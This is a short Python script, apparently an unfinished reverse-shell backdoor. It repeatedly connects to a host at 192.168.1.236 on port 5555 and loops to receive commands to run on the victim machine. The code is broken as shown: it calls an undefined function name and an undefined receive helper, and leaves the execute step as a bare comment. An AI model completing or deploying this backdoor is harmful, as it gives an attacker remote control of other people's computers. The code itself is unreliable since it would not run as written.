import socket
import time

def conection ():
       while True:
               time.sleep(20)  
               try:
                       s.connect(('192.168.1.236' ,5555))
                       shell()
                       s.close()
                       break
               except:
                conection()


def shell():
        while True:
                command = reliable_recv()
                if command == 'quit' :
                        break
                else:
                        #execute the command


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
      